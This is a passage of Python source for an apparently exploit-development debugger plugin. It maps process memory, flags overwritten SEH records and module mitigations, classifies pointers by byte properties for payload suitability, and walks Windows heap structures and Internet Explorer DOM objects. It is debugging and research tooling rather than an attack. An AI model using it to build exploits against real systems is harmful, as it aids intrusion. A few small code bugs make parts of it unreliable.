			records, overwritten = _walkSehChain(mteb.SEHChain)
			if overwritten:
				smash_parts = []
				for recaddr, odata in overwritten.items():
					smashoffset = int(odata[1])
					if odata[0] == "unicode":
						smashoffset += 2
					smash_parts.append("0x%s at offset %d%s" % (
						toHex(recaddr), smashoffset,
						" [unicode]" if odata[0] == "unicode" else ""))
				seh_info = " | SEH: %d records, <b>SMASHED: %s</b>" % (len(records), "; ".join(smash_parts))
			else:
				seh_info = " | SEH: %d records" % len(records)
		return (stack_low, stack_high, "Stack", "%sStack (TID: %s)%s" % (cur, tid, seh_info))

	def _module_entry(self, mod):
		"""Return (start, end, "Module", desc) from an MnModule instance."""
		dispname = mod.moduleFilename or mod.internalname
		if __DEBUGGERAPP__ == "WinDBG":
			dispname = clickModuleName(dispname)
		flags = [label for label, val in [
			("ASLR", mod.isAslr), ("Rebase", mod.isRebase), ("SafeSEH", mod.isSafeSEH),
			("NX", mod.isNX), ("CFG", mod.isCFG), ("OS", mod.isOS),
		] if val]
		flagstr = ", ".join(flags) if flags else "None"
		return (mod.moduleBase, mod.moduleTop, "Module",
				"%s (%s | %s)" % (dispname, flagstr, mod.modulePath))

	def _heap_internals(self, heapaddr, htype, info):
		"""
		Return (heap_entry, seg_pairs, va_entries) for one heap.
		  heap_entry : (start, end, "Heap", desc)
		  seg_pairs  : [(seg_entry, [chunk_entries]), ...]
		  va_entries : [(start, end, "Heap VA Block", desc), ...]
		Returns (corrupted_entry, [], []) when the heap signature is invalid.
		"""
		idx      = info.get("index", "?")
		heapname = clickHeapWinDBG(heapaddr, "nt", "Heap %d" % idx)
		if heapaddr == self.peb.ProcessHeap:
			heapname = "[Default] " + heapname
		mheap     = None
		corrupted = False
		try:
			mheap     = MnHeap(heapaddr)
			corrupted = mheap.isCorrupted()
		except Exception:
			corrupted = True
		heap_end = heapaddr + (mheap.getHeaderSize() if not corrupted and mheap else 0)
		if corrupted:
			return ((heapaddr, heap_end, "Heap", "%s (** CORRUPTED **)" % heapname), [], [])
		fe_label  = ""
		seg_count = va_count = 0
		if heapaddr in self.ntheapdetail:
			fe_type   = self.ntheapdetail[heapaddr].get("frontend_type", 0)
			fe_label  = " | FrontEnd: %s" % self._FE_NAMES.get(fe_type, "0x%x" % fe_type)
			seg_count = len(self.ntheapdetail[heapaddr].get("segments", {}))
			va_count  = len(self.ntheapdetail[heapaddr].get("va_blocks", {}))
		heap_entry = (heapaddr, heap_end, "Heap",
					  "%s (%s%s | Segments: %d | VA Blocks: %d)" % (heapname, htype, fe_label, seg_count, va_count))
		seg_pairs  = []
		va_entries = []
		if heapaddr not in self.ntheapdetail:
			return (heap_entry, seg_pairs, va_entries)
		detail     = self.ntheapdetail[heapaddr]
		hidx       = int(idx) if str(idx).isdigit() else 0
		lfh_ranges = detail.get("lfh_ranges", [])
		lfh_starts = [r[0] for r in lfh_ranges]
		vaaddrs    = sorted(detail.get("va_blocks", {}).keys())
		_all_seg_keys = list(detail["segments"].keys())
		# Heap-as-segment (segaddr == heapaddr) is Segment00 on Vista+.
		if heapaddr in detail["segments"]:
			segaddrs = [heapaddr] + sorted(s for s in _all_seg_keys if s != heapaddr)
		else:
			segaddrs = sorted(_all_seg_keys)
		_seg_idx = {s: j for j, s in enumerate(segaddrs)}
		for i, segaddr in enumerate(segaddrs):
			seg     = detail["segments"][segaddr]
			segname = clickSegmentWinDBG(segaddr, "nt", "Segment%02d-%02d" % (i, hidx))
			_flink  = seg.get("flink")
			_blink  = seg.get("blink")
			if _flink is not None:
				flink = "0x%s (%s)" % (toHex(_flink), "Segment%02d-%02d" % (_seg_idx[_flink], hidx)) if _flink in _seg_idx else "None"
			else:
				flink = "0x%s (%s)" % (toHex(segaddrs[i + 1]), "Segment%02d-%02d" % (i + 1, hidx)) if i < len(segaddrs) - 1 else "None"
			if _blink is not None:
				blink = "0x%s (%s)" % (toHex(_blink), "Segment%02d-%02d" % (_seg_idx[_blink], hidx)) if _blink in _seg_idx else "None"
			else:
				blink = "0x%s (%s)" % (toHex(segaddrs[i - 1]), "Segment%02d-%02d" % (i - 1, hidx)) if i > 0 else "None"
			chunk_info = ""
			if "total_chunks" in seg:
				chunk_info = " | Chunks: %d (Busy: %d, Free: %d, Free Max Size: 0x%x)" % (
					seg["total_chunks"], seg["busy_chunks"], seg["free_chunks"], seg["max_free"])
			seg_entry     = (seg["base"], seg["end"], "Heap Segment",
							 "%s (Heap: %s | FLink: %s | BLink: %s%s)" % (segname, heapname, flink, blink, chunk_info))
			chunk_entries = []
			if "chunks" in seg:
				all_chunks = sorted(
					(c["address"], c["size"], c["flag"], state, c["userptr"], c["usersize"])
					for state, chunklist in seg["chunks"].items()
					for c in chunklist
				)
				for ci, (caddr, csize, cflag, cstate, cuserptr, cusersize) in enumerate(all_chunks):
					lfh_tag = " | LFH" if _lfh_contains(caddr, lfh_ranges, lfh_starts) else ""
					cdesc   = "%s | UserPtr: %s, UserSize: 0x%x | State: %s | Heap %s, Segment %s | Flag: 0x%02x%s)" % (
						"Chunk%04d-%03d-%02d" % (ci, i, hidx),
						clickChunkPtr(cuserptr, cusersize), cusersize,
						cstate, heapname, segname, cflag, lfh_tag)
					chunk_entries.append((caddr, caddr + csize, "Heap Chunk", cdesc))
			seg_pairs.append((seg_entry, chunk_entries))
		for i, vaaddr in enumerate(vaaddrs):
			va    = detail["va_blocks"][vaaddr]
			vaend = vaaddr + va["commit_size"]
			flink = "0x%s (VirtualAllocdBlock%02d-%02d)" % (toHex(vaaddrs[i + 1]), hidx, i + 1) if i < len(vaaddrs) - 1 else "None"
			blink = "0x%s (VirtualAllocdBlock%02d-%02d)" % (toHex(vaaddrs[i - 1]), hidx, i - 1) if i > 0 else "None"
			va_entries.append((vaaddr, vaend, "Heap VA Block",
				"VirtualAllocdBlock%02d-%02d (Heap: %s | FLink: %s | BLink: %s | commit 0x%x, reserve 0x%x)" % (
					hidx, i, heapname, flink, blink, va["commit_size"], va["reserve_size"])))
		return (heap_entry, seg_pairs, va_entries)

	# --- Public view methods ---

	def getAllSorted(self):
		"""
		Return a unified flat view of all process structures sorted by start address.
		Each item: (start, end, category, description)
		Categories: "PEB", "TEB", "Stack", "Module", "Heap", "Heap Segment", "Heap VA Block", "Heap Chunk"
		"""
		regions  = []
		peb_size, teb_size = self._struct_sizes()
		if self.peb is not None:
			regions.append(self._peb_entry(peb_size))
		current_teb_addr = get_teb_addr()
		stackaddy        = dbg.getRegs().get(STACK_POINTER, 0)
		threads          = self.getThreads()
		stacks           = self.getStacks()
		if threads:
			for tid, mteb in threads.items():
				regions.append(self._teb_entry(tid, mteb, teb_size, current_teb_addr))
				sinfo = stacks.get(tid)
				if sinfo:
					regions.append(self._stack_entry(tid, mteb, sinfo, stackaddy))
		elif self.teb is not None:
			regions.append((self.teb, self.teb + teb_size, "TEB", "TEB"))
		for name in self.modules:
			regions.append(self._module_entry(MnModule(name)))
		for heapaddr, htype, info in self.getAllHeapsSorted():
			heap_entry, seg_pairs, va_entries = self._heap_internals(heapaddr, htype, info)
			regions.append(heap_entry)
			for seg_entry, chunk_entries in seg_pairs:
				regions.append(seg_entry)
				regions.extend(chunk_entries)
			regions.extend(va_entries)
		regions.sort(key=lambda x: x[0])
		return regions

	def getSortedByElement(self):
		"""
		Return a unified hierarchical view of all process structures sorted by start address.
		Each item: (start, end, category, description, children)
		Top categories: "PEB", "TEB", "Module", "Heap"
		Children:
		  - TEB  \u2192 [Stack]
		  - Heap \u2192 [Heap Segment (\u2192 [Heap Chunk]), Heap VA Block]
		"""
		regions  = []
		peb_size, teb_size = self._struct_sizes()
		if self.peb is not None:
			regions.append(self._peb_entry(peb_size) + ([],))
		current_teb_addr = get_teb_addr()
		stackaddy        = dbg.getRegs().get(STACK_POINTER, 0)
		threads          = self.getThreads()
		stacks           = self.getStacks()
		for tid, mteb in threads.items():
			children = []
			sinfo = stacks.get(tid)
			if sinfo:
				children.append(self._stack_entry(tid, mteb, sinfo, stackaddy) + ([],))
			regions.append(self._teb_entry(tid, mteb, teb_size, current_teb_addr) + (children,))
		for name in self.modules:
			regions.append(self._module_entry(MnModule(name)) + ([],))
		for heapaddr, htype, info in self.getAllHeapsSorted():
			heap_entry, seg_pairs, va_entries = self._heap_internals(heapaddr, htype, info)
			children = (
				[seg_entry + ([c + ([],) for c in chunk_entries],) for seg_entry, chunk_entries in seg_pairs] +
				[va + ([],) for va in va_entries]
			)
			regions.append(heap_entry + (children,))
		regions.sort(key=lambda x: x[0])
		return regions


#---------------------------------------#
#  Class to access pointer properties   #
#---------------------------------------#
class MnPointer:
	"""
	Class to access pointer properties
	"""

	# Constant byte-classification ranges — defined once at class level so
	# they are not rebuilt on every MnPointer instantiation.
	_NullRange          = [0]
	_AsciiRange         = list(range(1, 128))
	_AsciiPrintRange    = list(range(20, 127))
	_AsciiUpperRange    = list(range(65, 91))
	_AsciiLowerRange    = list(range(97, 123))
	_AsciiAlphaRange    = list(range(65, 91)) + list(range(97, 123))
	_AsciiNumericRange  = list(range(48, 58))
	_AsciiSpaceRange    = [32]

	def __init__(self,address):

		# check that the address is an integer
		if not type(address) == int and not type(address) == long:
			raise Exception("address should be an integer or long")
	
		self.address = address
		
		NullRange 			= MnPointer._NullRange
		AsciiRange			= MnPointer._AsciiRange
		AsciiPrintRange		= MnPointer._AsciiPrintRange
		AsciiUppercaseRange = MnPointer._AsciiUpperRange
		AsciiLowercaseRange = MnPointer._AsciiLowerRange
		AsciiAlphaRange     = MnPointer._AsciiAlphaRange
		AsciiNumericRange   = MnPointer._AsciiNumericRange
		AsciiSpaceRange     = MnPointer._AsciiSpaceRange
		
		self.HexAddress = toHex(address)

		self.ownerName  = ""

		# define the characteristics of the pointer
		byte1,byte2,byte3,byte4,byte5,byte6,byte7,byte8 = (0,)*8

		if arch == 32:
			byte1,byte2,byte3,byte4 = splitAddress(address)
		elif arch == 64:
			byte1,byte2,byte3,byte4,byte5,byte6,byte7,byte8 = splitAddress(address)
		
		# Nulls
		self.hasNulls = (byte1 == 0) or (byte2 == 0) or (byte3 == 0) or (byte4 == 0)
		
		# Starts with null
		self.startsWithNull = (byte1 == 0)
		
		# Unicode
		self.isUnicode = ((byte1 == 0) and (byte3 == 0))
		
		# Unicode reversed
		self.isUnicodeRev = ((byte2 == 0) and (byte4 == 0))

		if arch == 64:
			self.hasNulls = self.hasNulls or (byte5 == 0) or (byte6 == 0) or (byte7 == 0) or (byte8 == 0)
			self.isUnicode = self.isUnicode and ((byte5 == 0) and (byte7 == 0))
			self.isUnicodeRev = self.isUnicodeRev and ((byte6 == 0) and (byte8 == 0))
		
		# Unicode transform
		self.unicodeTransform = UnicodeTransformInfo(self.HexAddress) 

		# Ascii
		if not self.isUnicode and not self.isUnicodeRev:			
			self.isAscii = bytesInRange(address, AsciiRange)
		else:
			self.isAscii = bytesInRange(address, NullRange + AsciiRange)
		
		# AsciiPrintable
		if not self.isUnicode and not self.isUnicodeRev:
			self.isAsciiPrintable = bytesInRange(address, AsciiPrintRange)
		else:
			self.isAsciiPrintable = bytesInRange(address, NullRange + AsciiPrintRange)
			
		# Uppercase
		if not self.isUnicode and not self.isUnicodeRev:
			self.isUppercase = bytesInRange(address, AsciiUppercaseRange)
		else:
			self.isUppercase = bytesInRange(address, NullRange + AsciiUppercaseRange)
		
		# Lowercase
		if not self.isUnicode and not self.isUnicodeRev:
			self.isLowercase = bytesInRange(address, AsciiLowercaseRange)
		else:
			self.isLowercase = bytesInRange(address, NullRange + AsciiLowercaseRange)
			
		# Numeric
		if not self.isUnicode and not self.isUnicodeRev:
			self.isNumeric = bytesInRange(address, AsciiNumericRange)
		else:
			self.isNumeric = bytesInRange(address, NullRange + AsciiNumericRange)
			
		# Alpha numeric
		if not self.isUnicode and not self.isUnicodeRev:
			self.isAlphaNumeric = bytesInRange(address, AsciiAlphaRange + AsciiNumericRange + AsciiSpaceRange)
		else:
			self.isAlphaNumeric = bytesInRange(address, NullRange + AsciiAlphaRange + AsciiNumericRange + AsciiSpaceRange)
		
		# Uppercase + Numbers
		if not self.isUnicode and not self.isUnicodeRev:
			self.isUpperNum = bytesInRange(address, AsciiUppercaseRange + AsciiNumericRange)
		else:
			self.isUpperNum = bytesInRange(address, NullRange + AsciiUppercaseRange + AsciiNumericRange)
		
		# Lowercase + Numbers
		if not self.isUnicode and not self.isUnicodeRev:
			self.isLowerNum = bytesInRange(address, AsciiLowercaseRange + AsciiNumericRange)
		else:
			self.isLowerNum = bytesInRange(address, NullRange + AsciiLowercaseRange + AsciiNumericRange)
		
	
	def __str__(self):
		"""
		Get pointer properties (human readable format)

		Arguments:
		None

		Return:
		String with various properties about the pointer
		"""	

		outstring = ""
		if self.startsWithNull:
			outstring += "startnull,"
			
		elif self.hasNulls:
			outstring += "null,"
		
		#check if this pointer is unicode transform
		hexaddr = self.HexAddress
		outstring += UnicodeTransformInfo(hexaddr)

		if self.isUnicode:
			outstring += "unicode,"
		if self.isUnicodeRev:
			outstring += "unicodereverse,"			
		if self.isAsciiPrintable:
			outstring += "asciiprint,"
		if self.isAscii:
			outstring += "ascii,"
		if self.isUppercase:
			outstring == "upper,"
		if self.isLowercase:
			outstring += "lower,"
		if self.isNumeric:
			outstring+= "num,"
			
		if self.isAlphaNumeric and not (self.isUppercase or self.isLowercase or self.isNumeric):
			outstring += "alphanum,"
		
		if self.isUpperNum and not (self.isUppercase or self.isNumeric):
			outstring += "uppernum,"
		
		if self.isLowerNum and not (self.isLowercase or self.isNumeric):
			outstring += "lowernum,"
			
		outstring = outstring.rstrip(",")
		outstring += " {" + getPointerAccess(self.address)+"}"
		if self.ownerName != "":
			outstring += " - %s" % self.ownerName

		return outstring

	def getAddress(self):
		return self.address

	def getOwnerName(self):
		return self.ownerName
	
	def isUnicode(self):
		return self.isUnicode
		
	def isUnicodeRev(self):
		return self.isUnicodeRev		
	
	def isUnicodeTransform(self):
		return self.unicodeTransform != ""
	
	def isAscii(self):
		return self.isAscii
	
	def isAsciiPrintable(self):
		return self.isAsciiPrintable
	
	def isUppercase(self):
		return self.isUppercase
	
	def isLowercase(self):
		return self.isLowercase
		
	def isUpperNum(self):
		return self.isUpperNum
		
	def isLowerNum(self):
		return self.isLowerNum
		
	def isNumeric(self):
		return self.isNumeric
		
	def isAlphaNumeric(self):
		return self.alphaNumeric
	
	def hasNulls(self):
		return self.hasNulls
	
	def startsWithNull(self):
		return self.startsWithNull
		
	def belongsTo(self, modulesOnly=False):
		"""
		Retrieves the module a given pointer belongs to

		Arguments:
		modulesOnly - bool, if True only check modules, skip stack/heap checks

		Return:
		String with the name of the module a pointer belongs to,
		or empty if pointer does not belong to a module
		"""		
		populateModuleInfo()
		if self.ownerName == "":
			# not stack or heap
			for thismodule,modproperties in mnproc.g_modules.items():
				thisbase = getModuleProperty(thismodule,"base")
				thistop = getModuleProperty(thismodule,"top")
				if (self.address >= thisbase) and (self.address <= thistop):
					#self.ownerName = thismodule
					return thismodule
			# if it's not a module, maybe it's stack or heap
			# just call the functions, to populate owner
			if not modulesOnly:
				if not self.isOnStack():
					self.isInHeap()
		return ""
	

	def isOnStack(self):
		"""
		Checks if the pointer is on one of the stacks of one of the threads in the process

		Arguments:
		None

		Return:
		Boolean - True if pointer is on stack
		"""	
		stacks = getStacks()
		for stack in stacks:
			if (stacks[stack][0] <= self.address) and (self.address < stacks[stack][1]):
				self.ownerName = "Stack"
				return True
		return False
	

	def isInHeap(self):
		"""
		Checks if the pointer is part of one of the pages associated with process heaps/segments

		Arguments:
		None

		Return:
		Boolean - True if pointer is in heap
		"""
		_ensureMnProc(entities=["vacache"])

		# Check segments
		for heap, segstart, seglast in mnproc.VACache["segments"]:
			if self.address >= heap and self.address <= seglast:
				self.ownerName = "Heap Segment"
				return True

		# Check VA blocks
		for vastart, vaend in mnproc.VACache["vablocks"]:
			if self.address >= vastart and self.address <= vaend:
				self.ownerName = "VirtualAllocdBlock"
				return True

		return False
		

	def getHeapInfo(self):
		global silent
		oldsilent = silent
		silent = True
		foundinheap, foundinsegment, foundinva, foundinchunk = self.showHeapBlockInfo()
		silent = oldsilent
		return [foundinheap, foundinsegment, foundinva, foundinchunk]


	def showObjectInfo(self):
		# check if chunk is a DOM object
		if __DEBUGGERAPP__ == "WinDBG":
			cmdtorun = "dps %s L 1" % (PTR_PRINT % self.address)
			output = dbg.nativeCommand(cmdtorun)
			outputlower = output.lower()
			outputlines = output.split("\n")
			if "vftable" in outputlower:
				# is this Internet Explorer ?
				ieversion = 0
				if isModuleLoadedInProcess('iexplore.exe') and isModuleLoadedInProcess('mshtml.dll'):
					ieversionstr = getModuleProperty('iexplore.exe','version')
					dbg.log("      Internet Explorer v%s detected" % ieversionstr)
					ieversion = 0
					if ieversionstr.startswith("8."):
						ieversion = 8
					if ieversionstr.startswith("9."):
						ieversion = 9
					if ieversionstr.startswith("10."):
						ieversion = 10
				dbg.log("      %s may be the start of an object, vtable pointer: %s" % (PTR_PRINT % self.address),outputlines[0])
				vtableptr_s = outputlines[0][10:18]
				try:
					vtableptr = hexStrToInt(vtableptr_s)
					dbg.log("      Start of vtable at %s: (showing first 4 entries only)" % (PTR_PRINT % vtableptr))
					cmdtorun = "dps %s L 4" % (PTR_PRINT % vtableptr)
					output = dbg.nativeCommand(cmdtorun)
					outputlines = output.split("\n")
					cnt = 0
					for line in outputlines:
						if line.replace(" ","") != "":
							dbg.log("       +0x%x -> %s" % (cnt,line))
						cnt += 4
					if "mshtml!" in outputlower and ieversion > 7:
						# see if we can find the object type, refcounter, attribute count, parent, etc
						refcounter = None
						attributeptr = None
						try:
							refcounter = dbg.readLong(self.address + 4)
						except:
							pass
						try:
							if ieversion == 8:
								attributeptr = dbg.readLong(self.address + 0xc)
							if ieversion == 9:
								attributeptr = dbg.readLong(self.address + 0x10)
						except:
							pass
						if not refcounter is None and not attributeptr is None:
							dbg.log("      Refcounter: 0x%x (%d)" % (refcounter,refcounter))
							if refcounter > 0x20000:
								dbg.log("      Note: a huge refcounter value may indicate this is not a real DOM object")
							if attributeptr == 0:
								dbg.log("      No attributes found")
							else:
								ptrx = MnPointer(attributeptr)
								if ptrx.isInHeap():
									dbg.log("      Attribute info structure stored at 0x%08x" % attributeptr)
									offset_nr = 0x4
									nr_multiplier = 4
									offset_tableptr = 0xc
									offset_tabledata = 0
									variant_offset = 4
									attname_offset = 8
									attvalue_offset = 0xc
									if ieversion == 9:
										nr_multiplier = 1
										offset_nr = 0x4
										offset_tableptr = 0x8
										offset_tabledata = 4
										variant_offset = 1
										attname_offset = 4
										attvalue_offset = 8

									nr_attributes = dbg.readLong(attributeptr + offset_nr) / nr_multiplier
									attributetableptr = dbg.readLong(attributeptr + offset_tableptr)
									dbg.log("        +0x%02x : Nr of attributes: %d" % (offset_nr,nr_attributes))
									dbg.log("        +0x%02x : Attribute table at 0x%08x" % (offset_tableptr,attributetableptr))
									
									attcnt = 0
									while attcnt < nr_attributes:
										
										try:
											dbg.log("                Attribute %d (at 0x%08x) :" % (attcnt+1,attributetableptr))
											sec_dword = "%08x" % struct.unpack('<L',dbg.readMemory(attributetableptr+4,4))[0]
											variant_type = int(sec_dword[0:2][:-1],16)
											dbg.log("                  Variant Type : 0x%02x (%s)" % (variant_type,getVariantType(variant_type)))
											if variant_type > 0x1:
												att_name = "<n.a.>"
												try:
													att_name_ptr = dbg.readLong(attributetableptr+attname_offset)
													att_name_ptr_value = dbg.readLong(att_name_ptr+4)
													att_name = dbg.readWString(att_name_ptr_value)
												except:
													att_name = "<n.a.>"
												dbg.log("                  0x%08x + 0x%02x (0x%08x): 0x%08x : &Attribute name : '%s'" % (attributetableptr,attname_offset,attributetableptr+attname_offset,att_name_ptr,att_name))
												att_value_ptr = dbg.readLong(attributetableptr+attvalue_offset)
												ptrx = MnPointer(att_value_ptr)
												if ptrx.isInHeap():
													att_value = ""
													if variant_type == 0x8:
														att_value = dbg.readWString(att_value_ptr)
													if variant_type == 0x16:
														attv = dbg.readLong(att_value_ptr)
														att_value = "0x%08x (%s)" % (attv,int("0x%08x" % attv,16))
													if variant_type == 0x1e:
														att_from = dbg.readLong(att_value_ptr)
														att_value = dbg.readString(att_from)
													if variant_type == 0x1f:
														att_from = dbg.readLong(att_value_ptr)
														att_value = dbg.readWString(att_from)
												else:
													att_value = "0x%08x (%s)" % (att_value_ptr,int("0x%08x" % att_value_ptr,16))
												dbg.log("                  0x%08x + 0x%02x (0x%08x): 0x%08x : &Value : %s" % (attributetableptr,attvalue_offset,attributetableptr+attvalue_offset,att_value_ptr,att_value))
										except:
											dbg.logLines(traceback.format_exc(),highlight=True)
											break
										attributetableptr += 0x10 											
										attcnt += 1
								else:
									dbg.log("      Invalid attribute ptr found (0x%08x). This may not be a real DOM object." % attributeptr)


						offset_domtree = 0x14
						if ieversion == 9:
							offset_domtree = 0x1C
						domtreeptr = dbg.readLong(self.address + offset_domtree)
						if not domtreeptr is None:
							dptrx = MnPointer(domtreeptr)
							if dptrx.isInHeap():
								currobj = self.address
								moreparents = True
								parentcnt = 0
								dbg.log("      Object +0x%02x : Ptr to DOM Tree info: 0x%08x" % (offset_domtree,domtreeptr))								
								while moreparents:
									# walk tree, get parents
									parentspaces = " " * parentcnt
									cmdtorun = "dds poi(poi(poi(0x%08x+0x%02x)+4)) L 1" % (currobj,offset_domtree)
									output = dbg.nativeCommand(cmdtorun)
									outputlower = output.lower()
									outputlines = output.split("\n")
									if "vftable" in outputlines[0]:
										dbg.log("      %s Parent : %s" % (parentspaces,outputlines[0]))
										parts = outputlines[0].split(" ")
										try:
											currobj = int(parts[0],16)
										except:
											currobj = 0
									else:
										moreparents = False
									parentcnt += 3
									if currobj == 0:
										moreparents = False

				except:
					dbg.logLines(traceback.format_exc(),highlight=True)
					pass

		return



	def showHeapBlockInfo(self):
		"""
		Find address in heap and print out info about heap, segment, chunk it belongs to
		"""
		allheaps = []
		heapkey = 0
		
		foundinheap = None
		foundinsegment = None
		foundinva = None
		foundinchunk = None
		dumpsize = 0
		dodump = False

		try:
			allheaps = dbg.getHeapsAddress()
		except:
			allheaps = []
		for heapbase in allheaps:
			mHeap = MnHeap(heapbase)
			heapbase_extra = ""
			frontendinfo = []
			frontendheapptr = 0
			frontendheaptype = 0
			if win7mode:
				heapkey = mHeap.getEncodingKey()
				if mHeap.usesLFH():
					frontendheaptype = 0x2
					heapbase_extra = " [LFH] "
					frontendheapptr = mHeap.getLFHAddress()
			frontendinfo = [frontendheaptype,frontendheapptr]

			segments = mHeap.getHeapSegmentList()

			#segments
			for seg in segments:
				segstart = segments[seg]["base"]
				segend = segments[seg]["end"]
				FirstEntry = segments[seg]["firstentry"]
				LastValidEntry = segments[seg]["lastentry"]								
				allchunks = walkSegment(FirstEntry,LastValidEntry,heapbase)
				for chunkptr in allchunks:
					thischunk = allchunks[chunkptr]
					thissize = thischunk.size*8 
					headersize = thischunk.headersize
					if self.address >= chunkptr and self.address < (chunkptr + thissize):
						# found it !
						if not silent:
							dbg.log("")
							dbg.log("Address 0x%08x found in " % self.address)
							thischunk.showChunk(showdata = True)
							self.showObjectInfo()
							self.showHeapStackTrace(thischunk)
							dodump = True
							dumpsize = thissize
						foundinchunk = thischunk
						foundinsegment = seg
						foundinheap = heapbase
						break
				if not foundinchunk == None:
					break

			# VA
			if foundinchunk == None:
				# maybe it's in VirtualAllocdBlocks
				vachunks = mHeap.getVirtualAllocdBlocks()
				for vaptr in vachunks:
					vainfo = vachunks[vaptr]
					if self.address >= vaptr and self.address <= vaptr + vainfo["commit_size"]:
						if not silent:
							dbg.log("")
							dbg.log("Address 0x%08x found in VirtualAllocdBlocks of heap 0x%08x" % (self.address,heapbase))
							dbg.log("  VA block at 0x%08x, commit: 0x%x, reserve: 0x%x" % (vaptr, vainfo["commit_size"], vainfo["reserve_size"]))
							self.showObjectInfo()
							dumpsize = vainfo["commit_size"]
							dodump = True
						foundinchunk = vainfo
						foundinva = vaptr
						foundinheap = heapbase
						break

			# perhaps chunk is in FEA
			# if it is, it won't be a VA chunk
			if foundinva == None:
				if not win7mode:
					foundinlal = False
					foundinfreelist = False
					FrontEndHeap = mHeap.getFrontEndHeap()
					if FrontEndHeap > 0:
						fea_lal = mHeap.getLookAsideList()
						for lal_table_entry in sorted(fea_lal.keys()):
							nr_of_chunks = len(fea_lal[lal_table_entry])
							lalhead = struct.unpack('<L',dbg.readMemory(FrontEndHeap + (0x30 * lal_table_entry),4))[0]
							for chunkindex in fea_lal[lal_table_entry]:
								lalchunk = fea_lal[lal_table_entry][chunkindex]
								chunksize = lalchunk.size * 8
								flag = getHeapFlag(lalchunk.flag)
								if (self.address >= lalchunk.chunkptr) and (self.address < lalchunk.chunkptr+chunksize):
									foundinlal = True
									if not silent:
										dbg.log("Address is part of chunk on LookAsideList[%d], heap 0x%08x" % (lal_table_entry,mHeap.heapbase))
									break
							if foundinlal:
								expectedsize = lal_table_entry * 8
								if not silent:
									dbg.log("     LAL [%d] @0x%08x, Expected Chunksize: 0x%x (%d), %d chunks, Flink: 0x%08x" % (lal_table_entry,FrontEndHeap + (0x30 * lal_table_entry),expectedsize,expectedsize,nr_of_chunks,lalhead))
								for chunkindex in fea_lal[lal_table_entry]:
									lalchunk = fea_lal[lal_table_entry][chunkindex]
									foundchunk = lalchunk
									chunksize = lalchunk.size * 8
									flag = getHeapFlag(lalchunk.flag)
									extra = "       "
									if (self.address >= lalchunk.chunkptr) and (self.address < lalchunk.chunkptr+chunksize):
										extra = "   --> "
									if not silent:
										dbg.log("%sChunkPtr: 0x%08x, UserPtr: 0x%08x, Flink: 0x%08x, ChunkSize: 0x%x, UserSize: 0x%x, UserSpace: 0x%x (%s)" % (extra,lalchunk.chunkptr,lalchunk.userptr,lalchunk.flink,chunksize,lalchunk.usersize,lalchunk.usersize + lalchunk.remaining,flag))
								if not silent:
									self.showObjectInfo()
									dumpsize = chunksize
									dodump = True
								break

					if not foundinlal:
						# or maybe in BEA
						thisfreelist = mHeap.getFreeList()
						thisfreelistinusebitmap = mHeap.getFreeListInUseBitmap()				
						for flindex in thisfreelist:
							freelist_addy = heapbase + 0x178 + (8 * flindex)
							expectedsize = ">1016"
							expectedsize2 = ">0x%x" % 1016
							if flindex != 0:
								expectedsize2 = str(8 * flindex)
								expectedsize = "0x%x" % (8 * flindex)
							for flentry in thisfreelist[flindex]:
								freelist_chunk = thisfreelist[flindex][flentry]
								chunksize = freelist_chunk.size * 8
								if (self.address >= freelist_chunk.chunkptr) and (self.address < freelist_chunk.chunkptr+chunksize):
									foundinfreelist = True
									if not silent:
										dbg.log("Address is part of chunk on FreeLists[%d] at 0x%08x, heap 0x%08x:" % (flindex,freelist_addy,mHeap.heapbase))
									break
							if foundinfreelist:
								flindicator = 0
								for flentry in thisfreelist[flindex]:
									freelist_chunk = thisfreelist[flindex][flentry]
									chunksize = freelist_chunk.size * 8	
									extra = "     "
									if (self.address >= freelist_chunk.chunkptr) and (self.address < freelist_chunk.chunkptr+chunksize):						
										extra = " --> "
										foundchunk = freelist_chunk
									if not silent:
										dbg.log("%sChunkPtr: 0x%08x, UserPtr: 0x%08x, Flink: 0x%08x, Blink: 0x%08x, ChunkSize: 0x%x (%d), Usersize: 0x%x (%d)" % (extra,freelist_chunk.chunkptr,freelist_chunk.userptr,freelist_chunk.flink,freelist_chunk.blink,chunksize,chunksize,freelist_chunk.usersize,freelist_chunk.usersize))
									if flindex != 0 and chunksize != (8*flindex):
										dbg.log("     ** Header may be corrupted! **", highlight = True)
									flindicator = 1
								if flindex > 1 and int(thisfreelistinusebitmap[flindex]) != flindicator:
									if not silent:
										dbg.log("     ** FreeListsInUseBitmap mismatch for index %d! **" % flindex, highlight = True)
								if not silent:
									self.showObjectInfo()
									dumpsize = chunksize
									dodump = True
								break		

		if dodump and dumpsize > 0 and dumpsize < 1025 and not silent:
			self.dumpObjectAtLocation(dumpsize)	

		return foundinheap, foundinsegment, foundinva, foundinchunk

	def showHeapStackTrace(self,thischunk):
		# show stacktrace if any
		if __DEBUGGERAPP__ == "WinDBG": 
			stacktrace_address = thischunk.dph_block_information_stacktrace
			stacktrace_index = thischunk.dph_block_information_traceindex
			stacktrace_startstamp = 0xabcdaaaa
			if thischunk.hasust and stacktrace_address > 0:
				if stacktrace_startstamp == thischunk.dph_block_information_startstamp:
					cmd2run = "dps %s L 24" % (PTR_PRINT % stacktrace_address)
					output = dbg.nativeCommand(cmd2run)
					outputlines = output.split("\n")
					if "!" in output:
						dbg.log("Stack trace, index 0x%x:" % stacktrace_index)
						dbg.log("--------------------------")
						for outputline in outputlines:
							if "!" in outputline:
								lineparts = outputline.split(" ")
								if len(lineparts) > 2:
									firstpart = len(lineparts[0])+1
									dbg.log(outputline[firstpart:])
		return
	
	def memLocation(self):
		"""
		Gets the memory location associated with a given pointer (modulename, stack, heap or empty)
		
		Arguments:
		None
		
		Return:
		String
		"""

		memloc = self.belongsTo()
		
		if memloc == "":
			if self.isOnStack():
				return "Stack"
			if self.isInHeap():
				return "Heap"
			return "??"
		return memloc

	def getPtrFunction(self):
		funcinfo = ""
		global silent
		silent = True
		if __DEBUGGERAPP__ == "WinDBG":
			lncmd = "ln %s" % (PTR_PRINT % self.address)
			lnoutput = dbg.nativeCommand(lncmd)
			for line in lnoutput.split("\n"):
				if line.replace(" ","") != "" and line.find("%08x" % self.address) > -1:
					lineparts = line.split("|")
					funcrefparts = lineparts[0].split(")")
					if len(funcrefparts) > 1:
						funcinfo = funcrefparts[1].replace(" ","")
						break

		if funcinfo == "":
			memloc = self.belongsTo()
			if not memloc == "":
				mod = MnModule(memloc)
				if not mod is None:
					start = mod.moduleBase
					offset = self.address - start
					offsettxt = ""
					if offset > 0:
						offsettxt = "+0x%08x" % offset
					else:
						offsettxt = "__base__"
